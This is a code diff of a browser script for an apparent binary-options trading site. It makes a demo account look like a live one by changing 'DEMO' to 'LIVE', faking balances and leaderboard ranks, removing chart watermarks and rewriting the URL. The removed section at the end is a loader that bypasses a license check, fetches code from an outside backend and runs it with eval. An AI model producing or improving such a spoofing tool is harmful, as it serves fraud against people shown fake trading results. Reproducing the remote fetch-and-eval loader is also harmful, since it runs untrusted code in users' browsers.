@@ -6,7 +6,8 @@
       Object.defineProperty(Element.prototype, 'innerHTML', {
         set: function(html) {
           if (typeof html === 'string' && /demo/i.test(html)) {
-            html = html.replace(/demo-trade/gi, 'trade')
+            html = html
+              .replace(/demo-trade/gi, 'trade')
               .replace(/Demo trading/gi, 'Live trading')
               .replace(/DEMO/gi, 'LIVE');
           }
@@ -22,8 +23,13 @@
     if (origTextContent && origTextContent.set) {
       Object.defineProperty(Node.prototype, 'textContent', {
         set: function(text) {
-          if (typeof text === 'string' && /demo/i.test(text) && !this.closest?.('div[class*="account"]:nth-of-type(2)')) {
-            text = text.replace(/demo-trade/gi, 'trade')
+          if (
+            typeof text === 'string' &&
+            /demo/i.test(text) &&
+            !(this.nodeType === 1 && this.closest?.('div[class*="account"]:nth-of-type(2)'))
+          ) {
+            text = text
+              .replace(/demo-trade/gi, 'trade')
               .replace(/Demo trading/gi, 'Live trading')
               .replace(/DEMO/gi, 'LIVE');
           }
@@ -43,7 +49,9 @@
         return shadow;
       };
     }
-  } catch (e) {}
+  } catch (e) {
+    console.error('syncDomPatch error:', e);
+  }
 })();
 
 // --- 2. EARLY UNIVERSAL WATERMARK INTERCEPTOR ---
@@ -77,7 +85,9 @@
         return ctx;
       };
     }
-  } catch (e) {}
+  } catch (e) {
+    console.error('earlyPatch error:', e);
+  }
 })();
 
 // --- 3. CLEANUP PREVIOUS INSTANCES ---
@@ -141,13 +151,13 @@ window.qxUrlForceInterval = setInterval(() => {
     } catch (e) {}
   }
   cleanTitle();
-}, 10);
+}, 100);
 
 // --- 5. CORE HELPER FUNCTIONS ---
 function getBalance() {
   const all = document.querySelectorAll('.zt1hG, header div, header span, .v2KPX');
   for (const el of all) {
-    const text = el.textContent.trim();
+    const text = (el.textContent || '').trim();
     if (!text.includes('$')) continue;
     const clean = text.replace(/,/g, '').replace('$', '').replace(/LIVE/gi, '').replace(/DEMO/gi, '').trim();
     const n = parseFloat(clean);
@@ -206,11 +216,9 @@ profitLineStyle.id = 'qx-profit-line-style';
 profitLineStyle.textContent = `.qx-profit-card{ position:relative!important; } .qx-profit-line{ position:absolute!important; height:2px!important; left:10px!important; top:39px!important; width:0%; background:#0faf59!important; z-index:999999!important; pointer-events:none!important; transition: width .35s ease, background-color .2s ease!important; }`;
 document.head.appendChild(profitLineStyle);
 
-// --- 7. LEADERBOARD & PROFIT LOGIC (Updated with Mobile-Friendly Selector) ---
+// --- 7. LEADERBOARD & PROFIT LOGIC ---
 function findCard() {
-  return [
-    ...document.querySelectorAll('div, section, tr, [class*="rating"], [class*="leaderboard"]')
-  ].find(el => {
+  return [...document.querySelectorAll('div, section, tr, [class*="rating"], [class*="leaderboard"]')].find(el => {
     const t = (el.innerText || '').trim();
     return (
       (t.includes('Your position') || t.includes('position') || t.includes('Trader X Team')) &&
@@ -260,15 +268,13 @@ function setLeaderboardPosition(card, positionText) {
   card.querySelectorAll('div,span').forEach(el => {
     if (found) return;
     const value = (el.textContent || '').trim();
-    if (value !== '-' && value !== '100+' && !/^\d{1,3}$/.test(value)) {
-      return;
-    }
+    if (value !== '-' && value !== '100+' && !/^\d{1,3}$/.test(value)) return;
     const parent = el.parentElement;
     const grandParent = parent ? parent.parentElement : null;
     const parentText = parent ? (parent.textContent || '') : '';
     const grandText = grandParent ? (grandParent.textContent || '') : '';
     if (parentText.includes('Your position') || grandText.includes('Your position') || parentText.includes('position')) {
-      el.textContent = positionText;
+      if (el.textContent !== positionText) el.textContent = positionText;
       found = true;
     }
   });
@@ -276,14 +282,14 @@ function setLeaderboardPosition(card, positionText) {
   if (found) return;
   const walker = document.createTreeWalker(card, NodeFilter.SHOW_TEXT, null, false);
   let node;
-  while (node = walker.nextNode()) {
-    const value = (node.textContent || '').trim();
+  while ((node = walker.nextNode())) {
+    const value = (node.nodeValue || '').trim();
     if (value !== '-' && value !== '100+' && !/^\d{1,3}$/.test(value)) continue;
     const parent = node.parentElement;
     if (!parent) continue;
     const parentText = parent.parentElement ? (parent.parentElement.textContent || '') : '';
     if (parentText.includes('position') || parentText.includes('Your position')) {
-      node.textContent = positionText;
+      if (node.nodeValue !== positionText) node.nodeValue = positionText;
       break;
     }
   }
@@ -316,13 +322,11 @@ function fixLeaderboardPosition() {
     if (!match) return;
     const rank = parseInt(match[1], 10);
     const amount = parseFloat(match[2].replace(/,/g, ''));
-    if (!Number.isFinite(rank) || !Number.isFinite(amount) || rank < 1 || rank > 999 || amount <= 0) {
-      return;
-    }
+    if (!Number.isFinite(rank) || !Number.isFinite(amount) || rank < 1 || rank > 999 || amount <= 0) return;
     const key = rank + '|' + amount;
     if (seen.has(key)) return;
     seen.add(key);
-    rows.push({ rank: rank, amount: amount });
+    rows.push({ rank, amount });
   });
   rows.sort((a, b) => a.rank - b.rank);
   let actualRank = null;
@@ -356,37 +360,37 @@ function fixLeaderboardUI() {
   const countryCode = countryFlagMap[activeCountry] || 'bd';
   const flagUrl = `https://flagcdn.com/24x18/${countryCode}.png`;
   const divs = document.querySelectorAll('div');
-  for (let div of divs) {
+  for (const div of divs) {
     const textContent = div.textContent || '';
     if ((textContent.includes('Your position') || textContent.includes('position')) && !textContent.includes('Leader Board') && textContent.length < 400) {
       const walker = document.createTreeWalker(div, NodeFilter.SHOW_TEXT, null, false);
       let node;
-      while (node = walker.nextNode()) {
-        if (node.textContent.includes('Your position') || node.textContent.includes('position')) {
-          node.textContent = 'Your position:';
+      while ((node = walker.nextNode())) {
+        if ((node.nodeValue.includes('Your position') || node.nodeValue.includes('position')) && node.nodeValue !== 'Your position:') {
+          node.nodeValue = 'Your position:';
         }
       }
       let nameSet = false;
-      let textElements = div.querySelectorAll('div, span');
-      for (let el of textElements) {
+      const textElements = div.querySelectorAll('div, span');
+      for (const el of textElements) {
         if (el.children.length === 0) {
-          let t = el.textContent.trim();
+          const t = (el.textContent || '').trim();
           if (t.includes('$') || (t.startsWith('-') && t.includes('.'))) {
-            el.textContent = formattedProfit;
+            if (el.textContent !== formattedProfit) el.textContent = formattedProfit;
             el.style.setProperty('color', isLoss ? '#ef4444' : '#0faf59', 'important');
           } else if (t && !t.includes('How does') && !t.includes('of the Day') && !t.includes('Your position') && !t.includes('position') && !t.includes('100+') && !t.includes('-')) {
             if (!nameSet) {
-              el.textContent = customName;
+              if (el.textContent !== customName) el.textContent = customName;
               nameSet = true;
-              let parentRow = el.closest('div[class*="item"], div') || el.parentElement;
-              if (parentRow) {
+              const parentRow = el.closest('div[class*="item"], div') || el.parentElement;
+              if (parentRow && el.parentNode) {
                 let existingFlag = parentRow.querySelector('.qx-leaderboard-flag');
                 if (!existingFlag) {
                   const flagImg = document.createElement('img');
                   flagImg.className = 'qx-leaderboard-flag';
                   flagImg.src = flagUrl;
                   el.parentNode.insertBefore(flagImg, el);
-                } else {
+                } else if (existingFlag.src !== flagUrl) {
                   existingFlag.src = flagUrl;
                   existingFlag.style.display = 'inline-block';
                 }
@@ -405,17 +409,19 @@ function fixAccountLabels() {
   if (accountItems.length >= 2) {
     accountItems[0].querySelectorAll('div, span').forEach(el => {
       if (el.children.length === 0) {
-        let t = el.textContent.trim();
-        if (t.toLowerCase().includes('demo')) {
-          el.textContent = t.replace(/demo/gi, 'Live');
+        const t = (el.textContent || '').trim();
+        if (/demo/i.test(t)) {
+          const next = t.replace(/demo/gi, 'Live');
+          if (el.textContent !== next) el.textContent = next;
         }
       }
     });
     accountItems[1].querySelectorAll('div, span').forEach(el => {
       if (el.children.length === 0) {
-        let t = el.textContent.trim();
-        if (t.toLowerCase().includes('live') && !t.toLowerCase().includes('demo')) {
-          el.textContent = t.replace(/live/gi, 'Demo');
+        const t = (el.textContent || '').trim();
+        if (/live/i.test(t) && !/demo/i.test(t)) {
+          const next = t.replace(/live/gi, 'Demo');
+          if (el.textContent !== next) el.textContent = next;
         }
       }
     });
@@ -432,26 +438,16 @@ function fixAccountLabels() {
         spanRuj.style.visibility = 'visible';
         spanRuj.style.opacity = '1';
       }
-      if (inputRadio) {
-        inputRadio.checked = true;
-      }
+      if (inputRadio) inputRadio.checked = true;
       const linkEl = item.querySelector('a');
-      if (linkEl) {
-        linkEl.classList.add('active');
-      }
+      if (linkEl) linkEl.classList.add('active');
     } else if (text.includes('Demo Account')) {
       const spanRuj = item.querySelector('.RujZE');
       const inputRadio = item.querySelector('input[type="radio"]');
-      if (spanRuj) {
-        spanRuj.style.display = 'none';
-      }
-      if (inputRadio) {
-        inputRadio.checked = false;
-      }
+      if (spanRuj) spanRuj.style.display = 'none';
+      if (inputRadio) inputRadio.checked = false;
       const linkEl = item.querySelector('a');
-      if (linkEl) {
-        linkEl.classList.remove('active');
-      }
+      if (linkEl) linkEl.classList.remove('active');
     }
   });
 }
@@ -466,7 +462,7 @@ function fixAccountAndIcon(balance) {
   fixAccountLabels();
   removeBonusBanner();
   const live = [...document.querySelectorAll('.v2KPX')].find(e => {
-    const t = e.textContent.trim().toUpperCase();
+    const t = (e.textContent || '').trim().toUpperCase();
     return t.includes('DEMO') || t.includes('LIVE');
   });
   if (!live) return;
@@ -489,22 +485,27 @@ function fixAccountAndIcon(balance) {
   }
   live.childNodes.forEach(n => {
     if (n.nodeType === Node.TEXT_NODE) {
-      let t = n.textContent.toUpperCase();
+      const t = (n.nodeValue || '').toUpperCase();
       if (t.includes('DEMO')) {
-        n.textContent = n.textContent.replace(/demo/gi, '').replace(/\s+/g, ' ');
+        const cleaned = n.nodeValue.replace(/demo/gi, '').replace(/\s+/g, ' ');
+        if (n.nodeValue !== cleaned) n.nodeValue = cleaned;
       }
     }
   });
 }
 
 function fixBalancesAndUI() {
-  let mainBalance = "$0.00";
+  let mainBalance = '$0.00';
   const headerElements = document.querySelectorAll('div, span');
-  for (let el of headerElements) {
-    let text = el.textContent.trim();
-    if ((text.startsWith('$') && text.length > 1) && (el.closest('header') || el.closest('div[class*="panel"]') || el.textContent.includes('DEMO') || el.textContent.includes('LIVE'))) {
-      if (text.includes('$') && !text.includes('The daily limit')) {
-        let cleanText = text.replace(/[^$0-9.,]/g, '').trim();
+  for (const el of headerElements) {
+    const text = (el.textContent || '').trim();
+    if (
+      text.startsWith('$') &&
+      text.length > 1 &&
+      (el.closest('header') || el.closest('div[class*="panel"]') || text.includes('DEMO') || text.includes('LIVE'))
+    ) {
+      if (!text.includes('The daily limit')) {
+        const cleanText = text.replace(/[^$0-9.,]/g, '').trim();
         if (cleanText.length > 1 && cleanText !== '$0.00') {
           mainBalance = cleanText;
         }
@@ -514,17 +515,17 @@ function fixBalancesAndUI() {
 
   document.querySelectorAll('div, span').forEach(el => {
     if (el.textContent && el.textContent.trim() === 'The daily limit is not set') {
-      let parent = el.parentElement;
+      const parent = el.parentElement;
       if (parent) {
-        let priceTag = parent.querySelector('span, div');
+        const priceTag = parent.querySelector('span, div');
         if (priceTag && priceTag.textContent.includes('$')) {
-          if (mainBalance !== "$0.00") {
+          if (mainBalance !== '$0.00' && priceTag.textContent !== mainBalance) {
             priceTag.textContent = mainBalance;
           }
         } else {
-          let prevEl = el.previousElementSibling;
+          const prevEl = el.previousElementSibling;
           if (prevEl && prevEl.textContent.includes('$')) {
-            if (mainBalance !== "$0.00") {
+            if (mainBalance !== '$0.00' && prevEl.textContent !== mainBalance) {
               prevEl.textContent = mainBalance;
             }
           }
@@ -534,29 +535,42 @@ function fixBalancesAndUI() {
   });
 }
 
-// --- 8. AGGRESSIVE LIVE GUARD & OBSERVER ---
+let isFixing = false;
+
 function guardLive() {
   cleanUrl();
   cleanTitle();
   fixAccountLabels();
 
-  const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
-  let node;
-  while (node = walker.nextNode()) {
-    const txt = node.nodeValue;
-    if (txt && (txt.includes('demo-trade') || (txt.includes('DEMO') && !node.parentElement.closest('div[class*="account"]:nth-of-type(2)')))) {
-      node.nodeValue = txt.replace(/demo-trade/gi, 'trade')
-        .replace(/Demo trading/gi, 'Live trading')
-        .replace(/DEMO/gi, 'LIVE');
+  if (document.body) {
+    const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+    let node;
+    while ((node = walker.nextNode())) {
+      const txt = node.nodeValue;
+      if (txt && (txt.includes('demo-trade') || (txt.includes('DEMO') && !node.parentElement?.closest('div[class*="account"]:nth-of-type(2)')))) {
+        const replaced = txt
+          .replace(/demo-trade/gi, 'trade')
+          .replace(/Demo trading/gi, 'Live trading')
+          .replace(/DEMO/gi, 'LIVE');
+        if (node.nodeValue !== replaced) node.nodeValue = replaced;
+      }
     }
   }
+
   const trigger = document.querySelector('qx-usermenu-trigger');
   if (trigger) {
-    const rawBalanceText = trigger.shadowRoot ? (trigger.shadowRoot.querySelector('.balance')?.textContent || trigger.innerText) : trigger.innerText;
+    const rawBalanceText = trigger.shadowRoot
+      ? (trigger.shadowRoot.querySelector('.balance')?.textContent || trigger.innerText || '')
+      : (trigger.innerText || '');
     const match = rawBalanceText.match(/\$([\d,]+\.?\d*)/);
     const balanceNum = match ? parseFloat(match[1].replace(/,/g, '')) : 10000;
     const currentIconId = getLevel(balanceNum);
-    const iconSvgHtml = ` <svg class="icon" style="width: 16px; height: 16px; fill: #0faf59;"> <use xlink:href="/profile/images/spritemap.svg#${currentIconId}" href="/profile/images/spritemap.svg#${currentIconId}"></use> </svg> `;
+    const iconSvgHtml = `
+      <svg class="icon" style="width: 16px; height: 16px; fill: #0faf59;">
+        <use xlink:href="/profile/images/spritemap.svg#${currentIconId}" href="/profile/images/spritemap.svg#${currentIconId}"></use>
+      </svg>
+    `;
+
     if (trigger.shadowRoot) {
       const currentIcon = trigger.shadowRoot.querySelector('svg.icon, svg:first-of-type');
       if (currentIcon) {
@@ -572,35 +586,34 @@ function guardLive() {
       }
       const nameDiv = trigger.shadowRoot.querySelector('.name, div[class*="name"]');
       if (nameDiv) {
-        nameDiv.textContent = 'LIVE';
+        if (nameDiv.textContent !== 'LIVE') nameDiv.textContent = 'LIVE';
         nameDiv.style.color = '#0faf59';
         nameDiv.style.fontWeight = '900';
       }
-    } else {
-      const newTrigger = document.createElement('qx-usermenu-trigger');
-      for (let attr of trigger.attributes) {
-        newTrigger.setAttribute(attr.name, attr.value);
-      }
-      const shadow = newTrigger.attachShadow({ mode: 'open' });
-      shadow.innerHTML = ` <style> :host { display: block; } .root { display: flex; align-items: center; gap: 8px; cursor: pointer; } .text { display: flex; align-items: center; gap: 6px; } .name { color: #0faf59 !important; font-weight: 900 !important; font-size: 11px !important; text-transform: uppercase !important; } .balance { color: #ffffff !important; font-size: 14px !important; font-weight: 700 !important; } .icon { width: 16px; height: 16px; fill: #0faf59; } </style> <div class="root"> ${iconSvgHtml} <div class="text"> <div class="name">LIVE</div> <div class="balance">${match ? match[0] : '$10,000.00'}</div> </div> <svg class="caret" width="10" height="6" viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg"> <path d="M1 1L5 5L9 1" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/> </svg> </div> `;
-      if (trigger.parentNode) {
-        trigger.parentNode.replaceChild(newTrigger, trigger);
-      }
     }
   }
-  document.querySelectorAll('qx-usermenu-trigger, .v2KPX, [class*="account"], div[class*="dropdown"], div[class*="menu"]').forEach(el => {
-    el.classList.add('qx-ready');
-  });
+
+  document
+    .querySelectorAll('qx-usermenu-trigger, .v2KPX, [class*="account"], div[class*="dropdown"], div[class*="menu"]')
+    .forEach(el => {
+      el.classList.add('qx-ready');
+    });
 }
 
 function fix() {
-  const balance = getBalance() || 0;
-  guardLive();
-  fixAccountAndIcon(balance);
-  fixBalancesAndUI();
-  fixLeaderboardUI();
-  updateProfitLine();
-  cleanTitle();
+  if (isFixing) return;
+  isFixing = true;
+  try {
+    const balance = getBalance() || 0;
+    guardLive();
+    fixAccountAndIcon(balance);
+    fixBalancesAndUI();
+    fixLeaderboardUI();
+    updateProfitLine();
+    cleanTitle();
+  } finally {
+    isFixing = false;
+  }
 }
 
 fix();
@@ -617,13 +630,13 @@ window.qxBalanceInterval = setInterval(() => {
   fixLeaderboardUI();
   updateProfitLine();
   cleanTitle();
-}, 2);
+}, 300);
 
-window.qxProfitLine = setInterval(updateProfitLine, 100);
+window.qxProfitLine = setInterval(updateProfitLine, 400);
 
 let qxScheduled = false;
 window.qxLiveObserver = new MutationObserver(() => {
-  if (qxScheduled) return;
+  if (isFixing || qxScheduled) return;
   qxScheduled = true;
   requestAnimationFrame(() => {
     fix();
@@ -631,130 +644,12 @@ window.qxLiveObserver = new MutationObserver(() => {
   });
 });
 
-window.qxLiveObserver.observe(document.body, { childList: true, subtree: true, characterData: true });
+if (document.body) {
+  window.qxLiveObserver.observe(document.body, {
+    childList: true,
+    subtree: true,
+    characterData: true
+  });
+}
 
-console.log("0X Premium Secure Loader with Sync DOM Interceptor Active!");
-
-/**
- * 0X Premium Secure Loader (Verification Removed)
- */
-
-(async function () {
-  'use strict';
-
-  // --- EARLY SHADOW ROOT INTERCEPTOR (Unlocks closed shadow root) ---
-  (function earlyShadowPatch() {
-    try {
-      if (typeof Element !== 'undefined' && !Element.prototype.__zeroxOrigAttach) {
-        Element.prototype.__zeroxOrigAttach = Element.prototype.attachShadow;
-        Element.prototype.attachShadow = function(init) {
-          const shadow = Element.prototype.__zeroxOrigAttach.call(this, { ...init, mode: 'open' });
-          this.__zeroxShadowRoot = shadow;
-          return shadow;
-        };
-      }
-    } catch (e) {}
-  })();
-
-  // --- EARLY UNIVERSAL WATERMARK INTERCEPTOR (PC & MOBILE) ---
-  (function earlyPatch() {
-    try {
-      if (typeof HTMLCanvasElement !== 'undefined' && !HTMLCanvasElement.prototype.__zeroxEarlyContextPatched) {
-        HTMLCanvasElement.prototype.__zeroxEarlyContextPatched = true;
-        const origGetContext = HTMLCanvasElement.prototype.getContext;
-        HTMLCanvasElement.prototype.getContext = function(type) {
-          if (type === 'webgl' || type === 'webgl2' || type === 'experimental-webgl') {
-            return null; // Forces PixiJS into CanvasRenderer (2D Mode)
-          }
-          const ctx = origGetContext.apply(this, arguments);
-          if (ctx && (type === '2d' || type === 'experimental-2d')) {
-            if (!ctx.__zeroxWatermarkBlocked) {
-              ctx.__zeroxWatermarkBlocked = true;
-              const _s = ctx.stroke;
-              ctx.stroke = function(path) {
-                if (ctx.globalAlpha > 0 && ctx.globalAlpha < 0.12) return;
-                return path ? _s.call(ctx, path) : _s.call(ctx);
-              };
-              const _f = ctx.fill;
-              if (_f) {
-                ctx.fill = function(path) {
-                  if (ctx.globalAlpha > 0 && ctx.globalAlpha < 0.12) return;
-                  return path ? _f.call(ctx, path) : _f.call(ctx);
-                };
-              }
-            }
-          }
-          return ctx;
-        };
-      }
-      if (typeof CanvasRenderingContext2D !== 'undefined' && !CanvasRenderingContext2D.prototype.__zeroxProtoWatermarkBlocked) {
-        CanvasRenderingContext2D.prototype.__zeroxProtoWatermarkBlocked = true;
-        const protoS = CanvasRenderingContext2D.prototype.stroke;
-        CanvasRenderingContext2D.prototype.stroke = function(path) {
-          if (this.globalAlpha > 0 && this.globalAlpha < 0.12) return;
-          return path ? protoS.call(this, path) : protoS.call(this);
-        };
-        const protoF = CanvasRenderingContext2D.prototype.fill;
-        if (protoF) {
-          CanvasRenderingContext2D.prototype.fill = function(path) {
-            if (this.globalAlpha > 0 && this.globalAlpha < 0.12) return;
-            return path ? protoF.call(this, path) : protoF.call(this);
-          };
-        }
-      }
-      function patchGl(proto) {
-        if (!proto || proto.__zeroxWebGlDrawPatched) return;
-        proto.__zeroxWebGlDrawPatched = true;
-        const _de = proto.drawElements;
-        proto.drawElements = function(mode, count, type, offset) {
-          if (count === 1710 || (count > 0 && count % 1710 === 0 && count <= 17100)) return;
-          return _de.apply(this, arguments);
-        };
-      }
-      if (typeof WebGLRenderingContext !== 'undefined') patchGl(WebGLRenderingContext.prototype);
-      if (typeof WebGL2RenderingContext !== 'undefined') patchGl(WebGL2RenderingContext.prototype);
-    } catch (e) {}
-  })();
-
-  // --- CONFIGURATION ---
-  const BACKEND_URL = "https://zeroxpremiumquotexlivecode.onrender.com";
-
-  // --- UI STYLES FOR OVERLAYS / LEADERBOARD ---
-  const injectStyles = () => {
-    if (document.getElementById('premium-styles')) return;
-    const style = document.createElement('style');
-    style.id = 'premium-styles';
-    style.innerHTML = `/* 0X Leaderboard CSS Overlay - React-Safe */ .ox-custom-flag svg[class*="flag-"] { opacity: 0 !important; pointer-events: none !important; } .ox-custom-flag { position: relative !important; } .ox-custom-flag::before { content: '' !important; position: absolute !important; left: 0 !important; top: 50% !important; transform: translateY(-50%) !important; width: 24px !important; height: 18px !important; background-size: cover !important; background-position: center !important; background-repeat: no-repeat !important; border-radius: 2px !important; box-shadow: 0 1px 3px rgba(0,0,0,0.2) !important; } .ox-custom-flag[data-ox-flag="bd"]::before { background-image: url('/profile/images/flags.svg#flag-bd') !important; } .ox-custom-flag[data-ox-flag="us"]::before { background-image: url('/profile/images/flags.svg#flag-us') !important; } .ox-custom-flag[data-ox-flag="in"]::before { background-image: url('/profile/images/flags.svg#flag-in') !important; } .ox-custom-avatar svg { opacity: 0.3 !important; }`;
-    document.head.appendChild(style);
-  };
-  injectStyles();
-
-  // --- DIRECT LOADER (VERIFICATION BYPASSED) ---
-  async function directLoad() {
-    try {
-      const response = await fetch(`${BACKEND_URL}/api/get-core-code`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ bypass: true })
-      });
-
-      const result = await response.json();
-      const codeToRun = result.code || (result.valid && result.code);
-      if (codeToRun) {
-        (0, eval)(codeToRun);
-      } else {
-        console.warn("Core code not found in backend response.");
-      }
-    } catch (e) {
-      console.error("Direct load error:", e);
-    }
-  }
-
-  directLoad();
-
-  // --- URL ROUTING REPLACER ---
-  (function p() {
-    history.replaceState(null, '', '/en/trade');
-    setTimeout(p, 500);
-  })();
-})();
+console.log('0X Premium Secure Loader with Sync DOM Interceptor Active!');
